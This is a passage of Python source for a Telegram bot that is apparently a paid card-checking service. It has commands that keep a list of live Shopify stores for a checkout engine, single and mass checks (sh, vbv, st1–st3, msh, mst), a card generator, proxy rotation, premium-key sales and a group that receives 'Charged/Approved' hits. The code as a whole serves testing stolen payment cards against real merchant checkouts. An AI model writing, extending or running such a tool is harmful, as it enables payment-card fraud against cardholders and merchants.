    async with aiofiles.open(SITES_FILE, 'a', encoding='utf-8') as f:
        for site in live_sites:
            if site not in existing_set:
                await f.write(f"{site}\n")
                existing_set.add(site)
                added_count += 1

    total_sites = len(existing_set)
    msg = (
        f"{premium_emoji_tag('✅')} **𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐒𝐈𝐓𝐄 𝐒𝐂𝐀𝐍 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄**\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('📊')} **Checked** ➔ {total_to_check}\n"
        f"{premium_emoji_tag('🟢')} **Shopify Live** ➔ {len(live_sites)}\n"
        f"{premium_emoji_tag('✨')} **Added New** ➔ {added_count}\n"
        f"{premium_emoji_tag('📁')} **Total Database** ➔ {total_sites}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    clean_fin, ents_fin = build_entities_with_custom_emojis(msg)
    await status_msg.edit_text(clean_fin, entities=ents_fin)

async def chkmysite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Owner only command.")
        return

    existing_sites = load_sites()
    if not existing_sites:
        await update.message.reply_text("No sites in sites.txt to check.")
        return

    total_to_check = len(existing_sites)
    init_msg = f"{premium_emoji_tag('⏳')} Validating {total_to_check} saved sites..."
    clean_init, ents_init = build_entities_with_custom_emojis(init_msg)
    status_msg = await update.message.reply_text(clean_init, entities=ents_init)

    sem = asyncio.Semaphore(10)
    live_sites = []
    dead_sites = []
    checked_count = 0

    async def worker(site):
        nonlocal checked_count
        async with sem:
            is_live = await check_shopify_site_alive(site)
            checked_count += 1
            if is_live:
                live_sites.append(site)
            else:
                dead_sites.append(site)
            if checked_count % 10 == 0 or checked_count == total_to_check:
                try:
                    pct = int((checked_count / total_to_check) * 100)
                    progress_text = (
                        f"{premium_emoji_tag('📈')} Progress: {checked_count}/{total_to_check} [{pct}%]\n"
                        f"{premium_emoji_tag('✅')} Live: {len(live_sites)} | {premium_emoji_tag('❌')} Dead: {len(dead_sites)}"
                    )
                    clean_pr, ents_pr = build_entities_with_custom_emojis(progress_text)
                    await status_msg.edit_text(clean_pr, entities=ents_pr)
                except Exception:
                    pass

    await asyncio.gather(*[worker(site) for site in existing_sites])

    async with aiofiles.open(SITES_FILE, 'w', encoding='utf-8') as f:
        for site in live_sites:
            await f.write(f"{site}\n")

    msg = (
        f"{premium_emoji_tag('🏁')} **𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄 𝐂𝐋𝐄𝐀𝐍𝐄𝐃**\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('📊')} **Checked** ➔ {total_to_check}\n"
        f"{premium_emoji_tag('🟢')} **Kept (Live)** ➔ {len(live_sites)}\n"
        f"{premium_emoji_tag('🗑️')} **Removed (Dead)** ➔ {len(dead_sites)}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    clean_fin, ents_fin = build_entities_with_custom_emojis(msg)
    await status_msg.edit_text(clean_fin, entities=ents_fin)

# ==================== /chksites — Fast deep site validation ====================

async def _fast_check_site(site_url: str) -> dict:
    """Deep check using the SAME fetch_products logic that mass check uses.
    Returns dict with 'alive': bool, 'reason': str"""
    try:
        from gates.checkout_engine import fetch_products
        result = await fetch_products(site_url, proxy_str=None, use_cache=False)
        if isinstance(result, dict) and result.get('variant_id'):
            return {'alive': True, 'reason': f"OK (${result.get('price','?')})"}
        elif isinstance(result, tuple) and not result[0]:
            return {'alive': False, 'reason': result[1] if len(result) > 1 else 'Unknown'}
        else:
            return {'alive': False, 'reason': 'No valid products'}
    except Exception as e:
        return {'alive': False, 'reason': str(e)[:60]}

async def chksites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Owner only command.")
        return

    sites = load_sites()
    if not sites:
        await update.message.reply_text("❌ No sites in sites.txt.")
        return

    total = len(sites)
    init_raw = f"{premium_emoji_tag('⏳')} Deep-checking {total} sites..."
    clean_init, ents_init = build_entities_with_custom_emojis(init_raw)
    status_msg = await update.message.reply_text(clean_init, entities=ents_init)

    working = []
    removed = []
    checked = 0
    sem = asyncio.Semaphore(20)  # 20 concurrent (fetch_products is heavier)

    async def check_worker(site):
        nonlocal checked
        async with sem:
            result = await _fast_check_site(site)
            if result['alive']:
                working.append({'site': site, 'reason': result['reason']})
            else:
                removed.append({'site': site, 'reason': result['reason']})

            checked += 1
            if checked % 25 == 0 or checked == total or checked == 1:
                try:
                    pct = int((checked / total) * 100)
                    progress_raw = (
                        f"{premium_emoji_tag('⏳')} **Deep Site Check** [{pct}%]\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"{premium_emoji_tag('📈')} Progress: {checked}/{total}\n"
                        f"{premium_emoji_tag('✅')} Working: {len(working)}\n"
                        f"{premium_emoji_tag('❌')} Removed: {len(removed)}"
                    )
                    clean_pr, ents_pr = build_entities_with_custom_emojis(progress_raw)
                    await status_msg.edit_text(clean_pr, entities=ents_pr)
                except Exception:
                    pass

    await asyncio.gather(*[check_worker(s) for s in sites])

    # Save only working sites to sites.txt
    async with aiofiles.open(SITES_FILE, 'w', encoding='utf-8') as f:
        for s in working:
            await f.write(f"{s['site']}\n")

    # Build removed sites detail
    removed_detail = ""
    if removed:
        removed_lines = [f"  • {r['site'].replace('https://','').split('/')[0]} → {r['reason']}" for r in removed[:20]]
        removed_detail = "\n".join(removed_lines)
        if len(removed) > 20:
            removed_detail += f"\n  ... and {len(removed)-20} more"

    final_raw = (
        f"{premium_emoji_tag('🏁')} **𝐃𝐄𝐄𝐏 𝐒𝐈𝐓𝐄 𝐂𝐇𝐄𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄** {premium_emoji_tag('🏁')}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji_tag('📊')} **Total** ➔ {total}\n"
        f"{premium_emoji_tag('✅')} **Working (Kept)** ➔ {len(working)}\n"
        f"{premium_emoji_tag('❌')} **Removed** ➔ {len(removed)}\n"
    )
    if removed_detail:
        final_raw += (
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{premium_emoji_tag('🗑️')} **Removed Sites:**\n"
            f"{removed_detail}\n"
        )
    final_raw += "━━━━━━━━━━━━━━━━━━━━━━━━"

    clean_fin, ents_fin = build_entities_with_custom_emojis(final_raw)
    await status_msg.edit_text(clean_fin, entities=ents_fin)


import functools

def track_user_decorator(func):
    @functools.wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        # Ignore edited messages to prevent NoneType attribute crashes in command handlers
        if update and update.edited_message and not update.message:
            return
        if update and update.effective_user:
            track_user(update.effective_user.id, update.effective_user.username)
        # Check maintenance mode (only for non-owners)
        if update and update.message and update.message.text:
            text = update.message.text.strip()
            if text.startswith('/'):
                cmd_name = text.split()[0][1:].split('@')[0].lower()
                m_data = _load_json(MAINTENANCE_FILE)
                if m_data.get(cmd_name) and update.effective_user.id != OWNER_ID:
                    msg = (
                        f"{premium_emoji_tag('⚠️')} **Gate Under Maintenance**\n\n"
                        f"The command {{{{code:/{cmd_name}}}}} is currently under maintenance.\n"
                        f"Please try again later. Thank you for your patience!"
                    )
                    clean, ents = build_entities_with_custom_emojis(msg)
                    await update.message.reply_text(clean, entities=ents)
                    return
        return await func(update, context, *args, **kwargs)
    return wrapper

async def maintenance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Owner only command.")
        return

    parts = update.message.text.split()
    if len(parts) < 3:
        m_data = _load_json(MAINTENANCE_FILE)
        active = [f"/{cmd}" for cmd, status in m_data.items() if status]
        if active:
            msg = (
                f"{premium_emoji_tag('🛠️')} **Maintenance Status**\n\n"
                f"Currently under maintenance:\n"
                + "\n".join(f"- {{{{code:{cmd}}}}}" for cmd in active) + "\n\n"
                f"Usage: {{{{code:/maintenance <cmd> on|off}}}}"
            )
        else:
            msg = (
                f"{premium_emoji_tag('🛠️')} **Maintenance Status**\n\n"
                f"No commands are currently under maintenance.\n\n"
                f"Usage: {{{{code:/maintenance <cmd> on|off}}}}"
            )
        clean, ents = build_entities_with_custom_emojis(msg)
        await update.message.reply_text(clean, entities=ents)
        return

    cmd_to_toggle = parts[1].lower().replace('/', '')
    action = parts[2].lower()

    m_data = _load_json(MAINTENANCE_FILE)
    if action == 'on':
        m_data[cmd_to_toggle] = True
        msg = f"{premium_emoji_tag('✅')} Command {{{{code:/{cmd_to_toggle}}}}} has been put under maintenance."
    elif action == 'off':
        if cmd_to_toggle in m_data:
            del m_data[cmd_to_toggle]
        msg = f"{premium_emoji_tag('✅')} Command {{{{code:/{cmd_to_toggle}}}}} is now active (maintenance removed)."
    else:
        msg = f"Invalid action. Use {{{{code:on}}}} or {{{{code:off}}}}."

    _save_json(MAINTENANCE_FILE, m_data)
    clean, ents = build_entities_with_custom_emojis(msg)
    await update.message.reply_text(clean, entities=ents)

async def dauth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Owner only command.")
        return
    try:
        parts = update.message.text.split()
        if len(parts) < 2:
            clean, ents = build_entities_with_custom_emojis(f"Usage: {{{{code:/dauth <username_or_userid>}}}}")
            await update.message.reply_text(clean, entities=ents)
            return
        target = parts[1].strip()
    except (IndexError, ValueError):
        clean, ents = build_entities_with_custom_emojis(f"Usage: {{{{code:/dauth <username_or_userid>}}}}")
        await update.message.reply_text(clean, entities=ents)
        return

    target_id = find_user_id(target)
    if not target_id:
        await update.message.reply_text(f"User '{target}' not found in database. Try using their numeric User ID.")
        return

    prem = _load_json(PREMIUM_DATA_FILE)
    target_str = str(target_id)
    if target_str in prem:
        del prem[target_str]
        _save_json(PREMIUM_DATA_FILE, prem)
        
        msg = f"{premium_emoji_tag('✅')} **Premium revoked successfully** for User ID: {{{{code:{target_id}}}}}"
        clean, ents = build_entities_with_custom_emojis(msg)
        await update.message.reply_text(clean, entities=ents)
    else:
        await update.message.reply_text(f"User {target_id} is not a premium user.")


# ==================== HIT LOG GROUP SETUP ====================
async def setlog_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner-only command: /setlog — run in a group to set it as hit log destination."""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Owner only.")
        return
    chat = update.effective_chat
    if chat.type == 'private':
        await update.message.reply_text("Use this command in the group where you want hits sent.")
        return
    _save_hit_log_group(chat.id)
    clean, ents = build_entities_with_custom_emojis(
        f"{premium_emoji_tag('✅')} {bold_sans('Hit Log Group Set!')}\n"
        f"{premium_emoji_tag('📍')} **Group:** {chat.title}\n"
        f"{premium_emoji_tag('🆔')} **Chat ID:** {{{{code:{chat.id}}}}}\n\n"
        f"{premium_emoji_tag('⚡')} All hits (Charged/Approved) will now be sent here."
    )
    await update.message.reply_text(clean, entities=ents)


async def rmlog_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner-only command: /rmlog — disable hit log sending."""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("Owner only.")
        return
    _save_hit_log_group(None)
    clean, ents = build_entities_with_custom_emojis(
        f"{premium_emoji_tag('✅')} {bold_sans('Hit Log Disabled.')}\n"
        f"Hits will no longer be sent to any group."
    )
    await update.message.reply_text(clean, entities=ents)

# ==================== MAIN ====================
async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log exceptions caused by updates."""
    logging.getLogger("bot").error("Exception while handling an update:", exc_info=context.error)

def main():
    # Configure custom HTTPXRequest settings to avoid connection timeouts due to network latency/instability
    # Higher timeouts (60s) to handle slow DNS resolution and high-latency networks
    if TELEGRAM_PROXY_URL:
        request_config = HTTPXRequest(
            proxy=TELEGRAM_PROXY_URL,
            connect_timeout=60.0,
            read_timeout=60.0,
            write_timeout=60.0,
            pool_timeout=60.0
        )
    else:
        request_config = HTTPXRequest(
            connect_timeout=60.0,
            read_timeout=60.0,
            write_timeout=60.0,
            pool_timeout=60.0
        )
    app = Application.builder().token(BOT_TOKEN).request(request_config).concurrent_updates(True).build()
    app.add_handler(CommandHandler("start", track_user_decorator(start)))
    app.add_handler(CommandHandler("key", track_user_decorator(generate_keys)))
    app.add_handler(CommandHandler("redeem", track_user_decorator(redeem_key)))
    app.add_handler(CommandHandler("addpxy", track_user_decorator(add_single_proxy)))
    app.add_handler(CommandHandler("proxy", track_user_decorator(view_proxy_command)))
    app.add_handler(CommandHandler("chkpxy", track_user_decorator(check_proxies_command)))
    app.add_handler(CommandHandler("rmpxy", track_user_decorator(remove_proxy_command)))
    app.add_handler(CommandHandler("rm", track_user_decorator(remove_site_command)))
    app.add_handler(CommandHandler("sh", track_user_decorator(sh_single_check)))
    app.add_handler(CommandHandler("vbv", track_user_decorator(vbv_single)))
    app.add_handler(CommandHandler("st1", track_user_decorator(st1_single)))
    app.add_handler(CommandHandler("st2", track_user_decorator(st2_single)))
    app.add_handler(CommandHandler("st3", track_user_decorator(st3_single)))


    app.add_handler(CommandHandler("url", track_user_decorator(url_command)))
    app.add_handler(CommandHandler("gen", track_user_decorator(gen_command)))

    app.add_handler(CommandHandler("msh", track_user_decorator(msh_mass_check)))
    app.add_handler(CommandHandler("mshtxt", track_user_decorator(mshtxt_mass_check)))
    app.add_handler(CommandHandler("mst", track_user_decorator(mst_mass_check)))
    app.add_handler(CommandHandler("msttxt", track_user_decorator(msttxt_mass_check)))

    app.add_handler(CommandHandler("mpxy", track_user_decorator(mpxy_mass_proxy_check)))
    app.add_handler(CommandHandler("kd", track_user_decorator(kd_handler)))
    app.add_handler(CommandHandler("jio", track_user_decorator(jio_handler)))
    app.add_handler(CommandHandler("whop", track_user_decorator(whop_handler)))
    app.add_handler(CommandHandler("broadcast", track_user_decorator(broadcast_command)))
    app.add_handler(CommandHandler("sitetxt", track_user_decorator(sitetxt_command)))
    app.add_handler(CommandHandler("chkmysite", track_user_decorator(chkmysite_command)))
    app.add_handler(CommandHandler("chksites", track_user_decorator(chksites_command)))
    app.add_handler(CommandHandler("dauth", track_user_decorator(dauth_command)))
    app.add_handler(CommandHandler("setlog", track_user_decorator(setlog_command)))
    app.add_handler(CommandHandler("rmlog", track_user_decorator(rmlog_command)))
    app.add_handler(CommandHandler("maintenance", track_user_decorator(maintenance_command)))
    app.add_handler(CommandHandler("mt", track_user_decorator(maintenance_command)))
    app.add_handler(CallbackQueryHandler(track_user_decorator(callback_pause), pattern="^pause$"))
    app.add_handler(CallbackQueryHandler(track_user_decorator(callback_resume), pattern="^resume$"))
    app.add_handler(CallbackQueryHandler(track_user_decorator(callback_stop), pattern="^stop$"))
    app.add_handler(CallbackQueryHandler(track_user_decorator(callback_pxystop), pattern="^pxystop_"))
    app.add_handler(CallbackQueryHandler(track_user_decorator(menu_callbacks), pattern="^menu_"))
    app.add_handler(CallbackQueryHandler(lambda u, _: u.callback_query.answer(), pattern="^noop$"))
    app.add_error_handler(global_error_handler)
    print("Bot started ...")
    # drop_pending_updates=True skips any stale updates that accumulated while the bot was offline.
    # poll_interval=1.0 adds a 1 second delay between polls to reduce load.
    # bootstrap_retries=10 retries on startup failures (DNS/network issues).
    app.run_polling(bootstrap_retries=10, drop_pending_updates=True, poll_interval=1.0)

if __name__ == "__main__":
    main()
